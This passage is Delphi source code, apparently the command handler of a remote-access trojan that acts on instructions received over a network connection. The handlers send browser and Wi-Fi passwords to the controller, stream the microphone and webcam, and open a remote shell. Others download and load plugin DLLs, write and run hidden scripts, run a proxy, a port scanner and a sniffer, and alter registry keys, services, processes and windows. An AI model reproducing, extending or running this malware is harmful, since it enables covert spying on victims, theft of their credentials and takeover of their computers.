  if MainCommand = MICROPHONESTART then
  begin
    TmpStr := Copy(Datas, 1, Pos('|', Datas)-1);
    Delete(Datas, 1, Pos('|', Datas));

    AudioThread := TAudioThread.Create(StrToInt(Datas), StrToInt(TmpStr));
    AudioThread.Resume;
  end
  else

  if MainCommand = MICROPHONESTOP then
  begin
    AudioThread.StopStreaming;
    AudioThread.Free;
  end
  else
            
  if MainCommand = MOUSELEFTCLICK then
  begin
    TmpStr := Copy(Datas, 1, Pos('|', Datas)-1);
    Delete(Datas, 1, Pos('|', Datas));

    SetCursorPos(StrToInt(TmpStr), StrToInt(Datas));
    mouse_event(MOUSEEVENTF_LEFTDOWN, 0, 0, 0, 0);
    mouse_event(MOUSEEVENTF_LEFTUP, 0, 0, 0, 0);
  end
  else
                  
  if MainCommand = MOUSELEFTDOUBLECLICK then
  begin
    TmpStr := Copy(Datas, 1, Pos('|', Datas)-1);
    Delete(Datas, 1, Pos('|', Datas));

    SetCursorPos(StrToInt(TmpStr), StrToInt(Datas));
    mouse_event(MOUSEEVENTF_LEFTDOWN, 0, 0, 0, 0);
    mouse_event(MOUSEEVENTF_LEFTUP, 0, 0, 0, 0);
    mouse_event(MOUSEEVENTF_LEFTDOWN, 0, 0, 0, 0);
    mouse_event(MOUSEEVENTF_LEFTUP, 0, 0, 0, 0);
  end
  else
       
  if MainCommand = MOUSEMOVECURSOR then
  begin
    TmpStr := Copy(Datas, 1, Pos('|', Datas)-1);
    Delete(Datas, 1, Pos('|', Datas));
    SetCursorPos(StrToInt(TmpStr), StrToInt(Datas));
  end
  else

  if MainCommand = MOUSERIGHTCLICK then
  begin
    TmpStr := Copy(Datas, 1, Pos('|', Datas)-1);
    Delete(Datas, 1, Pos('|', Datas));

    SetCursorPos(StrToInt(TmpStr), StrToInt(Datas));
    mouse_event(MOUSEEVENTF_RIGHTDOWN, 0, 0, 0, 0);
    mouse_event(MOUSEEVENTF_RIGHTUP, 0, 0, 0, 0);
  end
  else

  if MainCommand = MOUSERIGHTDOUBLECLICK then
  begin
    TmpStr := Copy(Datas, 1, Pos('|', Datas)-1);
    Delete(Datas, 1, Pos('|', Datas));

    SetCursorPos(StrToInt(TmpStr), StrToInt(Datas));
    mouse_event(MOUSEEVENTF_RIGHTDOWN, 0, 0, 0, 0);
    mouse_event(MOUSEEVENTF_RIGHTUP, 0, 0, 0, 0);
    mouse_event(MOUSEEVENTF_RIGHTDOWN, 0, 0, 0, 0);
    mouse_event(MOUSEEVENTF_RIGHTUP, 0, 0, 0, 0);
  end
  else
       
  if MainCommand = MOUSESWAPBUTTONS then
  begin
    if Datas = 'Y' then SystemParametersInfo(SPI_SETMOUSEBUTTONSWAP, 1, nil, 0) else
      SystemParametersInfo(SPI_SETMOUSEBUTTONSWAP, 0, nil, 0); 
  end
  else
                
  if MainCommand = PASSWORDSBROWSERS then
  begin
    SendDatas(MainConnection, PASSWORDS + '|' + MainCommand + '|' + ListPasswords);
  end
  else

  if MainCommand = PASSWORDSWIFI then
  begin
    SendDatas(MainConnection, PASSWORDS + '|' + MainCommand + '|' + ListWifiPasswords);
  end
  else

  if MainCommand = PING then
  begin
    SendDatas(MainConnection, PONG + '|');
  end
  else
              
  if MainCommand = PLUGINSUPLOAD then
  begin
    TmpStr := Copy(Datas, 1, Pos('|', Datas)-1);
    Delete(Datas, 1, Pos('|', Datas));
    TmpInt := StrToInt(Copy(Datas, 1, Pos('|', Datas)-1));
    Delete(Datas, 1, Pos('|', Datas));
    if ReceiveFile(TmpStr, AppDataDir + 'plugin.dll', TmpInt, MainCommand) = True then
    SendDatas(MainConnection, PLUGINSCHECK + '|');
    LoadPlugin;
  end
  else

  if MainCommand = PORTSCANNERSTART then
  begin
    TmpStr := Copy(Datas, 1, Pos('|', Datas)-1);
    Delete(Datas, 1, Pos('|', Datas));
    TmpStr1 := Copy(Datas, 1, Pos('|', Datas)-1);
    Delete(Datas, 1, Pos('|', Datas));

    ScannerThread := TScannerThread.Create();
    ScannerThread.SetOptions(TmpStr, StrToInt(TmpStr1), StrToInt(Datas));
    ScannerThread.Resume;
  end
  else
    
  if MainCommand = PORTSCANNERSTOP then
  begin
    ScannerThread.StopScanning := True;
    ScannerThread.Free;
  end
  else

  if MainCommand = PORTSNIFFERINTERFACES then
  begin
    SnifferThread := TSnifferThread.Create();
    SnifferThread.ListInterfaces;
    SendDatas(MainConnection, PORTSNIFFER + '|' + MainCommand + '|' +
              SnifferThread.Interfaces);
  end
  else

  if MainCommand = PORTSNIFFERSTART then
  begin
    SnifferThread.Host := Datas;
    SnifferThread.Resume;
  end
  else
     
  if MainCommand = PORTSNIFFERSTOP then
  begin
    SnifferThread.Terminate;
    SnifferThread.Free;
  end
  else
                  
  if MainCommand = PROCESSKILL then
  begin
    if KillProcess(Datas) then
      TmpStr := TASKSMANAGER + '|' + PROCESS + '|' + MainCommand + '|' + Datas + '|Y'
    else TmpStr := TASKSMANAGER + '|' + PROCESS + '|' + MainCommand + '|' + Datas + '|N';

    SendDatas(MainConnection, TmpStr);
  end
  else

  if MainCommand = PROCESSLIST then
  begin
    SendDatas(MainConnection, TASKSMANAGER + '|' + PROCESS + '|' +
              MainCommand + '|' + ListProcess);
  end
  else
          
  if MainCommand = PROCESSRESUME then
  begin
    if ResumeProcess(StrToInt(Datas)) then
      TmpStr := TASKSMANAGER + '|' + PROCESS + '|' + MainCommand + '|' + Datas + '|Y'
    else TmpStr := TASKSMANAGER + '|' + PROCESS + '|' + MainCommand + '|' + Datas + '|N';

    SendDatas(MainConnection, TmpStr);
  end
  else
     
  if MainCommand = PROCESSSUSPEND then
  begin
    if SuspendProcess(StrToInt(Datas)) then
      TmpStr := TASKSMANAGER + '|' + PROCESS + '|' + MainCommand + '|' + Datas + '|Y'
    else TmpStr := TASKSMANAGER + '|' + PROCESS + '|' + MainCommand + '|' + Datas + '|N';

    SendDatas(MainConnection, TmpStr);
  end
  else
                
  if MainCommand = PROGRAMSLIST then
  begin
    SendDatas(MainConnection, TASKSMANAGER + '|' + PROGRAMS + '|' +
              MainCommand + '|' + ListPrograms);
  end
  else                                                 
      
  if MainCommand = PROGRAMSSILENTUNINSTALL then
  begin
    TmpStr := Copy(Datas, 1, Pos('|', Datas) - 1);
    Delete(Datas, 1, Pos('|', Datas) - 1);
    Delete(Datas, 1, Length('|'));
    MyShellExecute(TmpStr, Datas, SW_SHOWNORMAL);
  end
  else

  if MainCommand = PROGRAMSUNINSTALL then
  begin
    MyShellExecute(Datas, '', SW_SHOWNORMAL);
  end
  else

  if MainCommand = PROXYSTART then
  begin
    CloseHandle(ProxyMutex);
    ProxyMutex := CreateMutex(nil, False, PChar(_MutexName + '_PROXY'));
    if StartProxy(StrToInt(Datas), _MutexName + '_PROXY') then
    CloseHandle(ProxyMutex);
  end
  else
       
  if MainCommand = PROXYSTOP then
  begin
    CloseHandle(ProxyMutex); 
  end
  else
               
  if MainCommand = REGISTRYADDKEY_VALUE then
  begin
    TmpStr := Copy(Datas, 1, Pos('|', Datas)-1);
    Delete(Datas, 1, Pos('|', Datas));
    TmpStr1 := Copy(Datas, 1, Pos('|', Datas)-1);
    Delete(Datas, 1, Pos('|', Datas));
    TmpStr2 := Copy(Datas, 1, Pos('|', Datas)-1);
    Delete(Datas, 1, Pos('|', Datas));

    if TmpStr1 = '' then
    begin
      if AddRegKey(TmpStr) then
        TmpStr := UnitConstants.REGISTRY + '|' + MainCommand + '|' + TmpStr1 + '|Y'
      else TmpStr := UnitConstants.REGISTRY + '|' + MainCommand + '|' + TmpStr1 + '|N';
    end
    else
    begin
      if AddRegValue(TmpStr, TmpStr1, TmpStr2, Datas) then
        TmpStr := UnitConstants.REGISTRY + '|' + MainCommand + '|' + TmpStr1 + '|Y'
      else TmpStr := UnitConstants.REGISTRY + '|' + MainCommand + '|' + TmpStr1 + '|N';
    end;

    SendDatas(MainConnection, TmpStr);
  end
  else

  if MainCommand = REGISTRYDELETEKEY_VALUE then
  begin
    TmpStr := Copy(Datas, 1, Pos('|', Datas)-1);
    Delete(Datas, 1, Pos('|', Datas));
    TmpStr1 := Copy(Datas, 1, Pos('|', Datas)-1);
    Delete(Datas, 1, Pos('|', Datas));

    if Datas = 'Y' then
    begin
      if DeleteRegkey(TmpStr, TmpStr1, True) then
        TmpStr := UnitConstants.REGISTRY + '|' + MainCommand + '|' + TmpStr1 + '|Y'
      else TmpStr := UnitConstants.REGISTRY + '|' + MainCommand + '|' + TmpStr1 + '|N';
    end
    else
    begin
      if DeleteRegkey(TmpStr, TmpStr1, False) then
        TmpStr := UnitConstants.REGISTRY + '|' + MainCommand + '|' + TmpStr1 + '|Y'
      else TmpStr := UnitConstants.REGISTRY + '|' + MainCommand + '|' + TmpStr1 + '|N';
    end;

    SendDatas(MainConnection, TmpStr);
  end
  else

  if MainCommand = REGISTRYLISTKEYS then
  begin
    SendDatas(MainConnection, UnitConstants.REGISTRY + '|' +
              MainCommand + '|' + ListKeys(Datas));
  end
  else

  if MainCommand = REGISTRYLISTVALUES then
  begin
    SendDatas(MainConnection, UnitConstants.REGISTRY + '|' +
              MainCommand + '|' + ListValues(Datas));
  end
  else

  if MainCommand = REGISTRYRENAMEKEY then
  begin
    TmpStr := Copy(Datas, 1, Pos('|', Datas)-1);
    Delete(Datas, 1, Pos('|', Datas));

    if RenameRegistryItem(TmpStr, Datas) then
      TmpStr := UnitConstants.REGISTRY + '|' + MainCommand + '|' + TmpStr + '|Y|' + Datas
    else TmpStr := UnitConstants.REGISTRY + '|' + MainCommand + '|' + TmpStr + '|N|' + Datas;

    SendDatas(MainConnection, TmpStr);
  end
  else
          
  if MainCommand = SERVICESEDIT then
  begin
    TmpStr := Copy(Datas, 1, Pos('|', Datas)-1);
    Delete(Datas, 1, Pos('|', Datas));
    TmpStr1 := Copy(Datas, 1, Pos('|', Datas)-1);
    Delete(Datas, 1, Pos('|', Datas));
    TmpStr2 := Copy(Datas, 1, Pos('|', Datas)-1);
    Delete(Datas, 1, Pos('|', Datas));
    TmpStr3 := Copy(Datas, 1, Pos('|', Datas)-1);
    Delete(Datas, 1, Pos('|', Datas));

    if EditService(TmpStr, TmpStr1, TmpStr2, TmpStr3, StrToInt(Datas)) then
      TmpStr := TASKSMANAGER + '|' + SERVICES + '|' + MainCommand + '|' + TmpStr + '|Y'
    else TmpStr := TASKSMANAGER + '|' + SERVICES + '|' + MainCommand + '|' + TmpStr + '|N';

    SendDatas(MainConnection, TmpStr);
  end
  else

  if MainCommand = SERVICESINSTALL then
  begin
    TmpStr := Copy(Datas, 1, Pos('|', Datas)-1);
    Delete(Datas, 1, Pos('|', Datas));
    TmpStr1 := Copy(Datas, 1, Pos('|', Datas)-1);
    Delete(Datas, 1, Pos('|', Datas));
    TmpStr2 := Copy(Datas, 1, Pos('|', Datas)-1);
    Delete(Datas, 1, Pos('|', Datas));
    TmpStr3 := Copy(Datas, 1, Pos('|', Datas)-1);
    Delete(Datas, 1, Pos('|', Datas));

    if InstallService(TmpStr, TmpStr1, TmpStr2, TmpStr3, StrToInt(Datas)) then
      TmpStr := TASKSMANAGER + '|' + SERVICES + '|' + MainCommand + '|' + TmpStr + '|Y'
    else TmpStr := TASKSMANAGER + '|' + SERVICES + '|' + MainCommand + '|' + TmpStr + '|N';

    SendDatas(MainConnection, TmpStr);
  end
  else

  if MainCommand = SERVICESLIST then
  begin
    SendDatas(MainConnection, TASKSMANAGER + '|' + SERVICES + '|' +
              MainCommand + '|' + ListServices);
  end
  else

  if MainCommand = SERVICESSTART then
  begin
    if xStartService(Datas) then
      TmpStr := TASKSMANAGER + '|' + SERVICES + '|' + MainCommand + '|' + Datas + '|Y'
    else TmpStr := TASKSMANAGER + '|' + SERVICES + '|' + MainCommand + '|' + Datas + '|N';

    SendDatas(MainConnection, TmpStr);
  end
  else

  if MainCommand = SERVICESSTOP then
  begin
    if StopService(Datas) then
      TmpStr := TASKSMANAGER + '|' + SERVICES + '|' + MainCommand + '|' + Datas + '|Y'
    else TmpStr := TASKSMANAGER + '|' + SERVICES + '|' + MainCommand + '|' + Datas + '|N';

    SendDatas(MainConnection, TmpStr);
  end
  else

  if MainCommand = SERVICESUNINSTALL then
  begin
    if RemoveService(Datas) then
      TmpStr := TASKSMANAGER + '|' + SERVICES + '|' + MainCommand + '|' + Datas + '|Y'
    else TmpStr := TASKSMANAGER + '|' + SERVICES + '|' + MainCommand + '|' + Datas + '|N';

    SendDatas(MainConnection, TmpStr);
  end
  else
     
  if MainCommand = SCRIPT then
  begin
    TmpStr := Copy(Datas, 1, Pos('|', Datas)-1);
    Delete(Datas, 1, Pos('|', Datas));
    TmpStr1 := Copy(Datas, 1, Pos('|', Datas)-1);
    Delete(Datas, 1, Pos('|', Datas));

    if FileExists(AppDataDir + TmpStr) then MyDeleteFile(AppDataDir + TmpStr);
    CreateTextFile(AppDataDir + TmpStr, TmpStr1);
    if Datas = 'Y' then MyShellExecute(AppDataDir + TmpStr, '', SW_HIDE) else
    MyShellExecute(AppDataDir + TmpStr, '', SW_SHOWNORMAL);
  end
  else
     
  if MainCommand = SCRIPTVBS then
  begin
    if FileExists(AppDataDir + 'speaker.vbs') then MyDeleteFile(AppDataDir + 'speaker.vbs');
    CreateTextFile(AppDataDir + 'speaker.vbs',
      'CreateObject("SAPI.SPVoice").Speak"' + Datas + '"');
    HideFileName(AppDataDir + 'speaker.vbs');
    MyShellExecute(AppDataDir + 'speaker.vbs', '', SW_HIDE);
  end
  else

  if MainCommand = SHELLCOMMAND then
  begin
    ShellCmd := Datas;
  end
  else

  if MainCommand = SHELLSTART then
  begin
    StartThread(@ShellThread);
  end
  else

  if MainCommand = SHELLSTOP then
  begin
    ShellCmd := 'exit';
  end
  else
       
  if MainCommand = WEBCAMCONNECT then
  begin
    WebcamQuality := StrToInt(Copy(Datas, 1, Pos('|', Datas)-1));
    Delete(Datas, 1, Pos('|', Datas));
    WebcamInterval := StrToInt(Datas);
    PostMessage(ClientObject.Handle, WM_WEBCAMSTART, 0, 0);
  end
  else
          
  if MainCommand = WEBCAMDISCONNECT then
  begin
    SendWebcamImg := False;
    WebcamThread.Free;
  end
  else

  if MainCommand = WEBCAMSETTINGS then
  begin
    WebcamQuality := StrToInt(Copy(Datas, 1, Pos('|', Datas)-1));
    Delete(Datas, 1, Pos('|', Datas));
    WebcamInterval := StrToInt(Datas);
  end
  else
       
  if MainCommand = WINDOWSCLOSE then
  begin
    if SendMessage(StrToInt(Datas), 16, 0, 0) = 0 then
      TmpStr := TASKSMANAGER + '|' + UnitConstants.WINDOWS + '|' + MainCommand + '|' + Datas + '|Y'
    else TmpStr := TASKSMANAGER + '|' + UnitConstants.WINDOWS + '|' + MainCommand + '|' + Datas + '|N';

    SendDatas(MainConnection, TmpStr);
  end
  else

  if MainCommand = WINDOWSDISABLECLOSEBUTTON then
  begin
    TmpStr := Copy(Datas, 1, Pos('|', Datas)-1);
    Delete(Datas, 1, Pos('|', Datas));
    if Datas = 'Y' then CloseButton(StrToInt(TmpStr), True) else
      CloseButton(StrToInt(TmpStr), False);
  end
  else
         
  if MainCommand = WINDOWSHIDE then
  begin
    if ShowWindow(StrToInt(Datas), 0) then
      TmpStr := TASKSMANAGER + '|' + UnitConstants.WINDOWS + '|' + MainCommand + '|' + Datas + '|Y'
    else TmpStr := TASKSMANAGER + '|' + UnitConstants.WINDOWS + '|' + MainCommand + '|' + Datas + '|N';

    SendDatas(MainConnection, TmpStr);
  end
  else

  if MainCommand = WINDOWSLIST then
  begin
    TmpStr := TASKSMANAGER + '|' + UnitConstants.WINDOWS + '|' + MainCommand;
    if Datas = 'Y' then TmpStr := TmpStr + '|' + ListWindows else
      TmpStr := TmpStr + '|' + ListAllWindows;

    SendDatas(MainConnection, TmpStr);
  end
  else
         
  if MainCommand = WINDOWSLISTMESSAGESBOX then
  begin
    SendDatas(MainConnection, MainCommand + '|' + ListWindows);
  end
  else

  if MainCommand = WINDOWSSHAKE then
  begin
    TmpStr := Copy(Datas, 1, Pos('|', Datas)-1);
    Delete(Datas, 1, Pos('|', Datas));
    ShakeWindow(StrToInt(TmpStr), StrToInt(Datas));
  end
  else

  if MainCommand = WINDOWSSHOW then
  begin
    if ShowWindow(StrToInt(Datas), 1) then
      TmpStr := TASKSMANAGER + '|' + UnitConstants.WINDOWS + '|' + MainCommand + '|' + Datas + '|Y'
    else TmpStr := TASKSMANAGER + '|' + UnitConstants.WINDOWS + '|' + MainCommand + '|' + Datas + '|N';

    SendDatas(MainConnection, TmpStr);
  end
  else
            
  if MainCommand = WINDOWSTHUMBNAILS then
  begin
    while Datas <> '' do
    begin
      ProcessMessages;
      TmpStr := Copy(Datas, 1, Pos('|', Datas)-1);
      Delete(Datas, 1, Pos('|', Datas));
      TmpStr1 := GetDesktopImage(80, 300, 200, StrToInt(TmpStr));    
      TmpStr2 := TmpStr2 + TmpStr + '|' + TmpStr1 + '|';
    end;

    SendDatas(MainConnection, TASKSMANAGER + '|' + UnitConstants.WINDOWS + '|' +
      WINDOWSTHUMBNAILS + '|' + TmpStr2);
  end
  else

  if MainCommand = WINDOWSTITLE then
  begin
    TmpStr := Copy(Datas, 1, Pos('|', Datas)-1);
    Delete(Datas, 1, Pos('|', Datas));

    if SetWindowText(StrToInt(TmpStr), PChar(Datas)) then
      TmpStr := TASKSMANAGER + '|' + UnitConstants.WINDOWS + '|' + MainCommand + '|' + TmpStr + '|Y|' + Datas
    else TmpStr := TASKSMANAGER + '|' + UnitConstants.WINDOWS + '|' + MainCommand + '|' + TmpStr + '|N|' + Datas;

    SendDatas(MainConnection, TmpStr);
  end;
end;
                                                    
initialization
  WM_WEBCAMLIST := RegisterWindowMessage('hgijiohtgjibfgyfufvergvyfgvyrf');
  WM_WEBCAMDIRECTX := RegisterWindowMessage('hgijiohtgkllkgfklfklbgklfgvyrf');
  WM_WEBCAMSTART := RegisterWindowMessage('jkdkfkjvrfgrevkjbkgkrgegrers');   

end.
